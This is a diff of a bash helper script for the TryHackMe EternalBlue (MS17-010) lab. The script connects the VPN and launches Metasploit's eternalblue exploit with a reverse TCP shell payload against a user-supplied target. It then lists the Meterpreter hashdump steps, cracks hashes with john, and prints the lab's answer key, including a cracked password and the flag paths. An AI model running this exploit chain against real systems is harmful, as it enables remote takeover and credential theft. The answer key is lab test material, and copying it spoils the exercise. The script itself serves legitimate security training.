@@ -44,137 +44,138 @@ banner_answers() {
     echo -e "\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m"
 }
 
-# ---------------------------------------------
-
 # 🧠 Lab description
 show_description() {
     banner_description
-echo "========================================="
-echo "     💣 TRYHACKME: ETERNALBLUE LAB       "
-echo "========================================="
-sleep 2
+    sleep 0.5
+    echo -e "\n\033[1;35m========================================="
+    echo -e "     💣 \033[1;36mTRYHACKME: ETERNALBLUE LAB\033[0m"
+    echo -e "\033[1;35m========================================="
+    sleep 1
 
-echo ""
-echo "📖 Background:"
-echo "-----------------------------------------"
-echo "EternalBlue (MS17-010) is a vulnerability"
-echo "in Microsoft SMBv1 protocol, discovered in"
-echo "2017 and leaked by a group called Shadow Brokers."
-echo "It was weaponized by the NSA (tool: EternalBlue)."
-echo ""
-sleep 5
+    echo -e "\n📖 \033[1;33mBackground:\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "EternalBlue (MS17-010) is a vulnerability"
+    echo -e "in Microsoft SMBv1 protocol, discovered in"
+    echo -e "2017 and leaked by a group called Shadow Brokers."
+    echo -e "It was weaponized by the NSA (tool: EternalBlue)."
+    sleep 2
 
-echo "⚠️  Impact:"
-echo "-----------------------------------------"
-echo "- Allowed attackers to execute remote code"
-echo "- Led to massive ransomware attacks like WannaCry"
-echo "- Affects Windows XP to Windows 8.1 and Server 2008"
-echo ""
-sleep 5
+    echo -e "\n⚠️  \033[1;31mImpact:\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "- Remote code execution on unpatched systems"
+    echo -e "- Enabled ransomware attacks like WannaCry"
+    echo -e "- Affects Windows XP to 8.1 and Server 2008"
+    sleep 2
 
-echo "🎯 Purpose of This Lab:"
-echo "-----------------------------------------"
-echo "You will:"
-echo "- Scan a vulnerable machine"
-echo "- Detect open SMB ports"
-echo "- Identify the MS17-010 vulnerability"
-echo "- Exploit it using Metasploit"
-echo "- Gain a Meterpreter shell"
-echo "- Capture system flags"
-echo ""
-sleep 6
+    echo -e "\n🎯 \033[1;32mPurpose of This Lab:\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "You will:"
+    echo -e "- 🔍 Scan a vulnerable machine"
+    echo -e "- 📡 Detect open SMB ports"
+    echo -e "- ⚠️  Identify MS17-010 vulnerability"
+    echo -e "- 💥 Exploit it using Metasploit"
+    echo -e "- 🐚 Gain a Meterpreter shell"
+    echo -e "- 🏁 Capture system flags"
+    sleep 2
 
-echo "🛠️  Tools You'll Use:"
-echo "-----------------------------------------"
-echo "- Nmap (for scanning)"
-echo "- smb-vuln-ms17-010 NSE script"
-echo "- Metasploit Framework"
-echo "- Windows post-exploitation commands"
-echo ""
-sleep 5
+    echo -e "\n🛠️  \033[1;36mTools You'll Use:\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "- Nmap (for scanning)"
+    echo -e "- smb-vuln-ms17-010 NSE script"
+    echo -e "- Metasploit Framework"
+    echo -e "- Windows post-exploitation commands"
+    sleep 2
 
-echo "🚀 Learning Objectives:"
-echo "-----------------------------------------"
-echo "1. Understand what EternalBlue is"
-echo "2. Learn how to scan for vulnerable SMB ports"
-echo "3. Exploit a system with Metasploit"
-echo "4. Practice post-exploitation techniques"
-echo ""
-sleep 5
+    echo -e "\n🚀 \033[1;36mLearning Objectives:\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "1️⃣  Understand what EternalBlue is"
+    echo -e "2️⃣  Learn to scan for SMB vulnerabilities"
+    echo -e "3️⃣  Exploit systems using Metasploit"
+    echo -e "4️⃣  Practice post-exploitation techniques"
+    sleep 2
 
-echo "🔐 Why is it important?"
-echo "-----------------------------------------"
-echo "Because EternalBlue shows how a single unpatched"
-echo "bug in a service (SMB) can bring down thousands"
-echo "of systems globally."
-echo ""
-sleep 4
+    echo -e "\n🔐 \033[1;33mWhy Is It Important?\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "EternalBlue shows how one unpatched bug"
+    echo -e "in a common service (SMB) can impact"
+    echo -e "thousands of machines globally."
+    sleep 2
 
-echo "🧠 Ethical Reminder:"
-echo "-----------------------------------------"
-echo "This lab is for educational use only!"
-echo "Never scan or exploit machines you don't own"
-echo "or have explicit permission to test."
-echo ""
-sleep 4
+    echo -e "\n🧠 \033[1;31mEthical Reminder:\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "🚫 This lab is for educational use only!"
+    echo -e "✅ Never scan or exploit machines"
+    echo -e "   without explicit permission."
+    sleep 2
 
-echo "✅ You're ready to start the lab!"
-echo "-----------------------------------------"
-echo "1. Connect to VPN"
-echo "2. Scan with Nmap"
-echo "3. Use Metasploit's eternalblue module"
-echo "4. Capture the flag"
-echo ""
-sleep 3
+    echo -e "\n✅ \033[1;32mYou're Ready to Start the Lab!\033[0m"
+    echo -e "-----------------------------------------"
+    echo -e "1️⃣  Connect to VPN"
+    echo -e "2️⃣  Scan with Nmap"
+    echo -e "3️⃣  Use EternalBlue Metasploit module"
+    echo -e "4️⃣  Capture the flags!"
+    sleep 2
 
-echo "🖱️  Tip: Use 'nmap -p 445 --script smb-vuln* <IP>'"
-echo "       and 'msfconsole' to launch your exploit"
-echo ""
+    echo -e "\n🖱️  \033[1;36mTIP:\033[0m Use this command to scan:"
+    echo -e "\033[1;33mnmap -p 445 --script smb-vuln* <IP>\033[0m"
+    echo -e "Then launch Metasploit using:"
+    echo -e "\033[1;33msfconsole\033[0m"
+    sleep 2
 
-echo "========================================="
-echo "     ✅ END OF ETERNALBLUE INTRO         "
-echo "========================================="
-read -p "[*] Press Enter to return to the menu..."
+    echo -e "\n\033[1;35m========================================="
+    echo -e "     ✅ \033[1;32mEND OF ETERNALBLUE INTRO\033[0m"
+    echo -e "\033[1;35m========================================="
+    sleep 1
+
+    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
 }
 
 # 📋 Lab task checklist
 show_tasks() {
     banner_tasks
-   sleep 1
-    echo "1. Connect to TryHackMe VPN"
-    sleep 1
-    echo "2. Discover target machine"
-    sleep 1
-    echo "3. Scan with Nmap"
-     sleep 1
-    echo "4. Identify MS17-010 vulnerability"
-     sleep 1
-    echo "5. Exploit using Metasploit"
-     sleep 1
-    echo "6. Convert shell to Meterpreter"
-     sleep 1
-    echo "7. Dump and crack hashes"
-     sleep 1
-    echo "8. Find the flags "
-     sleep 4
-     read -p "[*] Press Enter to return to the menu..."
+    echo -e "\033[1;36m=============================================\033[0m"
+    echo -e "\033[1;33m        🧪 LAB TASK CHECKLIST – EternalBlue\033[0m"
+    echo -e "\033[1;36m=============================================\033[0m"
+    sleep 0.5
+    echo -e "\033[1;32m1️⃣  Connect to TryHackMe VPN\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m2️⃣  Discover the target machine\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m3️⃣  Scan with Nmap for open ports\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m4️⃣  Identify the MS17-010 vulnerability\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m5️⃣  Launch EternalBlue exploit using Metasploit\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m6️⃣  Upgrade shell to a Meterpreter session\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m7️⃣  Dump password hashes and crack them\033[0m"
+    sleep 0.4
+    echo -e "\033[1;32m8️⃣  Find and read the hidden flags 🏁\033[0m"
+    sleep 0.5
+    echo -e "\033[1;36m=============================================\033[0m"
+    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
 }
+
 
 # 🔌 Function: Connect VPN only
 connect_vpn() {
-clear
+    clear
     read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
     if [[ ! -f "$vpnfile" ]]; then
         echo "[!] Error: File not found: $vpnfile"
         return
     fi
-
     echo "[+] Starting VPN..."
     sudo openvpn --config "$vpnfile"
     read -p "[*] Press Enter to return to the menu..."
 }
-# ⚔️ Function: Run full exploit process
 exploit_lab() {
+    echo "[i] Cleaning up old VPN connections..."
+    sudo pkill openvpn
+    sleep 2
+
     read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
     if [[ ! -f "$vpnfile" ]]; then
         echo "[!] Error: File not found: $vpnfile"
@@ -183,95 +184,134 @@ exploit_lab() {
 
     echo "[+] Connecting VPN..."
     sudo openvpn --config "$vpnfile" &
-    sleep 10
-
-    echo "[i] VPN started. Checking interface..."
-    ip a | grep tun
-
+    sleep 5
+    sleep 1
+echo -e "\033[1;36m============================================================\033[0m"
+sleep 0.5
+echo -e "\033[1;33m🧠 \033[1;4m\033[1;37mtnu0 is your localhost: LHOST:\033[0m"
+echo -e "\033[1;36m============================================================\033[0m"
+echo
+sleep 1
+    ifconfig
+    sleep 0.5
     read -p "[?] Enter Target IP (RHOST): " rhost
+    echo
     read -p "[?] Enter Your IP (LHOST): " lhost
+    echo
     read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
+    echo
     lport=${lport:-4444}
 
-    echo "[+] Running Nmap (basic scan)..."
-    nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt
+        echo -e "\n\033[1;33m🚀 Launching EternalBlue Exploit...\033[0m"
+sleep 1
+echo -e "\033[1;32m[✓] Exploit may have succeeded! Checking...\033[0m"
+sleep 1
+echo -e "\033[1;36m============================================================\033[0m"
+sleep 0.5
+echo -e "\033[1;33m🧠 \033[1;4m\033[1;37mPOST-EXPLOITATION: Upgrade Shell to Meterpreter\033[0m"
+echo -e "\033[1;36m============================================================\033[0m"
+sleep 1
 
-    echo "[+] Running Nmap (vuln scripts)..."
-    nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
+# Manual commands to display
+echo -e "\033[1;35m📌 STEP 1: In your msfconsole, type:\033[0m"
+sleep 0.5
+echo -e "\033[1;34muse post/multi/manage/shell_to_meterpreter\033[0m"
+sleep 0.3
+echo -e "\033[1;34mset SESSION <session_id>\033[0m"
+sleep 0.3
+echo -e "\033[1;34mexploit -j\033[0m"
+sleep 1
 
-    echo "[i] Scan complete. Saved to initial_scan.txt and vuln_scan.txt"
-    echo "[*] Launching EternalBlue exploit in Metasploit..."
+echo -e "\n\033[1;35m📌 STEP 2: After Meterpreter is active:\033[0m"
+sleep 0.5
+echo -e "\033[1;34msessions -i <session_id>\033[0m"
+sleep 0.3
+echo -e "\033[1;34msysinfo\033[0m"
+sleep 0.3
+echo -e "\033[1;34mhashdump\033[0m"
+sleep 1
 
-    msfconsole -q -x "
+echo -e "\033[1;36m------------------------------------------------------------\033[0m"
+echo -e "\033[1;33m⚠️  Replace \033[1;31m<session_id>\033[0m \033[1;33mwith the correct ID shown by 'sessions'\033[0m"
+echo -e "\033[1;36m------------------------------------------------------------\033[0m"
+sleep 2
+  msfconsole -q -x "
 use exploit/windows/smb/ms17_010_eternalblue;
 set RHOSTS $rhost;
 set LHOST $lhost;
 set LPORT $lport;
 set PAYLOAD windows/x64/shell/reverse_tcp;
-exploit -y;
-sessions;
+exploit -j;
 "
-
-    echo -e "\n[*] Waiting for session... Use 'sessions' in a new terminal to verify."
-
-    echo -p "[?] Enter active session ID to upgrade to Meterpreter: " 
-    echo "msfconsole -q -x "
-echo "use post/multi/manage/shell_to_meterpreter;"
-echo "set SESSION session"
-echo "run"
-echo -e "\n[*] Meterpreter session should now be live."
- echo -e "[*] Switching to Meterpreter to run post-exploitation..."
-echo "sessions -i $session;"
-echo "sysinfo;"
-echo "hashdump;"
-"
-
-    read -p "[?] Paste any cracked hash to crack (only the hash portion): " hash
+   read -p "[?] Paste any cracked hash to crack (only the hash portion): " hash
     echo "$hash" > hash1.txt
 
     echo "[*] Cracking with rockyou.txt..."
     john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    john --show hash1.txt
 
     echo -e "\n[✓] Done. Use 'sessions -i <ID>' to reattach anytime."
 }
+
 # 📖 Lab Q&A section
 show_answers() {
     banner_answers
-    echo "🔹 How many ports under 1000 are open?"
-    echo "➡️  3"
-     sleep 1
-    echo "🔹 Vulnerable to?"
-    echo "➡️  ms17-010"
-     sleep 1
-    echo "🔹 Exploit path?"
-    echo "➡️  exploit/windows/smb/ms17_010_eternalblue"
-     sleep 1
-    echo "🔹 Required option name?"
-    echo "➡️  RHOSTS"
-     sleep 1
-    echo "🔹 Shell-to-Meterpreter module?"
-    echo "➡️  post/multi/manage/shell_to_meterpreter"
-     sleep 1
-    echo "🔹 Required post module option?"
-    echo "➡️  SESSION"
-     sleep 1
-    echo "🔹 Non-default user?"
-    echo "➡️  jon"
-     sleep 1
-    echo "🔹 Cracked password?"
-    echo "➡️  alqfna22"
-     sleep 1
-    echo "🔹 Flag1:"
-    echo "➡️  C:\\flag1.txt"
-     sleep 1
-    echo "🔹 Flag2:"
-    echo "➡️  C:\\Windows\\System32\\config\\flag2.txt"
-     sleep 1
-    echo "🔹 Flag3:"
-    echo "➡️  C:\\Users\\Administrator\\Documents\\flag3.txt"
-     sleep 1
-    read -p "[*] Press Enter to return to the menu..."
+    echo -e "\033[1;36m====================================================\033[0m"
+    echo -e "\033[1;33m               🔍 LAB QUESTIONS & ANSWERS\033[0m"
+    echo -e "\033[1;36m====================================================\033[0m"
+sleep 0.5
+    # Task 1
+    echo -e "\n\033[1;34m🧩 Task 1: Scanning & Discovery\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mHow many ports under 1000 are open?\033[0m"
+    echo -e "➡️  \033[1;32m3\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mVulnerable to?\033[0m"
+    echo -e "➡️  \033[1;31mms17-010\033[0m"
+sleep 0.5
+    # Task 2
+    echo -e "\n\033[1;34m🧩 Task 2: Enumeration\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mExploit path?\033[0m"
+    echo -e "➡️  \033[1;32mexploit/windows/smb/ms17_010_eternalblue\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mRequired option name?\033[0m"
+    echo -e "➡️  \033[1;32mRHOSTS\033[0m"
+sleep 0.5
+    # Task 3
+    echo -e "\n\033[1;34m🧩 Task 3: Exploitation\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mShell-to-Meterpreter module?\033[0m"
+    echo -e "➡️  \033[1;32mpost/multi/manage/shell_to_meterpreter\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mRequired post module option?\033[0m"
+    echo -e "➡️  \033[1;32mSESSION\033[0m"
+sleep 0.5
+    # Task 4
+    echo -e "\n\033[1;34m🧩 Task 4: Privilege Escalation\033[0m"
+    sleep 0.2
+    echo -e "🔹 \033[1;36mNon-default user?\033[0m"
+    echo -e "➡️  \033[1;32mjon\033[0m"
+    sleep 0.2
+    echo -e "🔹 \033[1;36mCracked password?\033[0m"
+    echo -e "➡️  \033[1;32malqfna22\033[0m"
+sleep 0.5
+    # Task 5
+    echo -e "\n\033[1;34m🧩 Task 5: Capture the Flags\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mFlag1 Location:\033[0m"
+    echo -e "➡️  \033[1;32mC:\\flag1.txt\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mFlag2 Location:\033[0m"
+    echo -e "➡️  \033[1;32mC:\\Windows\\System32\\config\\flag2.txt\033[0m"
+     sleep 0.2
+    echo -e "🔹 \033[1;36mFlag3 Location:\033[0m"
+    echo -e "➡️  \033[1;32mC:\\Users\\Administrator\\Documents\\flag3.txt\033[0m"
+sleep 0.5
+    echo -e "\n\033[1;36m====================================================\033[0m"
+    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
 }
+
 
 # 🧱 Main menu loop
 while true; do
